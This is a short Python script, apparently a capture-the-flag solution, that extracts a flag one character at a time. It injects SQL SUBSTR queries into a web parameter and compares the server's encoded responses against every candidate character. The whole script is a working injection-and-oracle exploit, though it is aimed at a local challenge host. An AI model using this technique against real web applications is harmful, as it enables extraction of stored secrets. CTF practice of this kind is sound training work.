import requests 
from urllib.parse import quote
url = "http://challenge.localhost:80/"

flagchar=""
flag=""
i = 1


chars = [chr(i) for i in range(1, 128) if i != "'"]

while flagchar != "}":
    cypher_char = requests.get(f"{url}?query=SUBSTR((SELECT flag), {i}, 1)").text.split("\n")[5]
    cypher_char = cypher_char.split("<pre>")[1].split("<")[0]
    for candidate in chars:
        
        query = f"'{quote(candidate)}'"
        if candidate == "'":
            query = f"""%22{quote(candidate)}%22"""
        

        cypher_candidate =  requests.get(f"""{url}?query={query}""").text.split("\n")[5]
        cypher_candidate = cypher_candidate.split("<pre>")[1].split("<")[0]
        
        if (cypher_candidate == cypher_char):
            flagchar = candidate
            flag += flagchar
            print(flag)
            i += 1
           
    
    
        
